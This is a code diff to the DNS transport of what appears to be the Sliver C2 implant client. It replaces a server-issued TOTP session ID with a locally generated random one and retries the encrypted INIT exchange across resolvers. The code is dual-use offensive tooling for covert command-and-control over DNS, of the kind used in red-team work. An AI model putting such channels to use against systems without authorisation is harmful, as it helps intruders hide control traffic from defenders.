@@ -286,16 +286,14 @@ func (s *SliverDNSClient) SessionInit() error {
 	log.Printf("[dns] found resolvers: %v", s.resolvConf.Servers)
 	// {{end}}
 
-	err = s.getDNSSessionID() // Get a 'dns session id'
-	if err != nil {
-		return err
-	}
-	s.fingerprintResolvers() // Fingerprint the resolvers
-	if len(s.resolvers) < 1 {
-		// {{if .Config.Debug}}
-		log.Printf("[dns] no working resolvers!")
-		// {{end}}
-		return errNoResolvers
+	// Generate a random session ID locally. The server will only allocate state
+	// after a successful INIT, which avoids an unauthenticated session bootstrap.
+	if s.dnsSessionID == 0 {
+		sid, err := s.randomDNSSessionID()
+		if err != nil {
+			return err
+		}
+		s.dnsSessionID = sid
 	}
 
 	// Key agreement with server
@@ -308,45 +306,56 @@ func (s *SliverDNSClient) SessionInit() error {
 		// {{end}}
 		return err
 	}
-	resolver, _ := s.randomResolver()
 	initMsg := &dnspb.DNSMessage{
 		ID:   s.nextMsgID(),
 		Type: dnspb.DNSMessageType_INIT,
 		Size: uint32(len(initData)),
 	}
-	respData, err := s.sendInit(resolver, s.base32, initMsg, initData)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("[dns] init msg send failure %v", err)
-		// {{end}}
-		return err
-	}
 
-	if len(respData) < 1 {
-		// {{if .Config.Debug}}
-		log.Printf("[dns] no data received in message")
-		// {{end}}
-		return ErrEmptyResponse
+	var respData []byte
+	var initErr error
+	for _, resolver := range s.resolvers {
+		respData, initErr = s.sendInit(resolver, s.base32, initMsg, initData)
+		if initErr != nil {
+			continue
+		}
+		if len(respData) < 1 {
+			initErr = ErrEmptyResponse
+			continue
+		}
+		data, err := s.cipherCtx.Decrypt(respData)
+		if err != nil {
+			initErr = err
+			continue
+		}
+		if binary.LittleEndian.Uint32(data)&sessionIDBitMask != s.dnsSessionID {
+			initErr = errInvalidDNSSessionID
+			continue
+		}
+		initErr = nil
+		break
 	}
-
-	data, err := s.cipherCtx.Decrypt(respData)
-	if err != nil {
+	if initErr != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[dns] init msg decryption failure %v", err)
+		log.Printf("[dns] init msg send failure %v", initErr)
 		// {{end}}
-		return err
-	}
-	if binary.LittleEndian.Uint32(data)&sessionIDBitMask != s.dnsSessionID {
-		// {{if .Config.Debug}}
-		log.Printf("[dns] init msg dns session id mismatch")
-		// {{end}}
-		return err
+		return initErr
 	}
 
 	// Good to go!
 	// {{if .Config.Debug}}
 	log.Printf("[dns] key exchange was successful!")
 	// {{end}}
+
+	// Now that we have a server-side session, benchmark/fingerprint resolvers and
+	// drop ones that error.
+	s.fingerprintResolvers()
+	if len(s.resolvers) < 1 {
+		// {{if .Config.Debug}}
+		log.Printf("[dns] no working resolvers!")
+		// {{end}}
+		return errNoResolvers
+	}
 
 	// {{if .Config.Debug}}
 	log.Printf("[dns] starting worker(s) ...")
@@ -778,40 +787,19 @@ func (s *SliverDNSClient) SplitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 	return subdata, nil
 }
 
-func (s *SliverDNSClient) getDNSSessionID() error {
-	otpMsg, err := s.otpMsg()
-	if err != nil {
-		return err
-	}
-	otpDomain, err := s.joinSubdataToParent(otpMsg)
-	if err != nil {
-		return err
-	}
-	// {{if .Config.Debug}}
-	log.Printf("[dns] Fetching dns session id via '%s' ...", otpDomain)
-	// {{end}}
-
-	var a []byte
-	for _, resolver := range s.resolvers {
-		a, _, err = resolver.A(otpDomain)
-		if err == nil {
-			break
+func (s *SliverDNSClient) randomDNSSessionID() (uint32, error) {
+	// sessionID is 24-bit and must be non-zero.
+	randBuf := make([]byte, 4)
+	for {
+		_, err := rand.Read(randBuf)
+		if err != nil {
+			return 0, err
+		}
+		sid := binary.LittleEndian.Uint32(randBuf) & sessionIDBitMask
+		if sid != 0 {
+			return sid, nil
 		}
 	}
-	if err != nil {
-		return err // All resolvers failed
-	}
-	if len(a) < 1 {
-		return errInvalidDNSSessionID
-	}
-	s.dnsSessionID = binary.LittleEndian.Uint32(a) & sessionIDBitMask
-	if s.dnsSessionID == 0 {
-		return errInvalidDNSSessionID
-	}
-	// {{if .Config.Debug}}
-	log.Printf("[dns] dns session id: %d", s.dnsSessionID)
-	// {{end}}
-	return nil
 }
 
 func (s *SliverDNSClient) loadResolvConf() error {
@@ -890,19 +878,6 @@ func (s *SliverDNSClient) clearMsg(msgId uint32) (string, error) {
 		Data: nonceBuf,
 	})
 	msg, _ := s.base32.Encode(clearMsg)
-	return string(msg), nil
-}
-
-func (s *SliverDNSClient) otpMsg() (string, error) {
-	otpMsg := &dnspb.DNSMessage{
-		Type: dnspb.DNSMessageType_TOTP,
-		ID:   uint32(0), // Take advantage of the variable length encoding
-	}
-	data, err := proto.Marshal(otpMsg)
-	if err != nil {
-		return "", err
-	}
-	msg, _ := s.base32.Encode(data)
 	return string(msg), nil
 }
 
